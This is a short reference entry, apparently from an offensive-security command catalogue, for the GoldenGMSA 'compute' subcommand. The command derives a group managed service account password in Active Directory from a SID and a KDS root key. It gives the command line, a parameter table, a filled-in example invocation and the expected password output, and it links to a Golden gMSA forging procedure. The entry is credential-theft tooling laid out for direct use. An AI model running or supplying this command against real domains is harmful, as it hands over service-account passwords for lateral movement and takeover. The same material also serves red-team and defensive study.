---
id: 70897855-d63c-44a4-a122-6eb256ee0d9a
name: golden-gmsa-compute-password-ldap-access
type: command
executor: bash
data: GoldenGMSA.exe compute --sid $_GMSA_SID --kdskey $_KDS_KEY
output: null
created_at: '2023-04-06T03:56:04.615633+00:00'
updated_at: '2023-04-10T20:25:56.697280+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - password-computation
verified: true
validated: true
---

# golden-gmsa-compute-password-ldap-access

## Command

```bash
GoldenGMSA.exe compute --sid $_GMSA_SID --kdskey $_KDS_KEY
```

## Description

Computes the GMSA password using a provided KDS root key, suitable for LDAP-only access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --sid | SID of the GMSA | Yes |
| --kdskey | Base64-encoded KDS root key blob | Yes |
| compute | Subcommand to compute password | Yes |

## Examples

### Basic Usage

```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M=
```

## Expected Output

Computed password:
```
Password: ComputedPlaintextPassword123!
```

## Related

- [[procedures/Forging-Golden-GMSA]]
- [[tools/GoldenGMSA]]
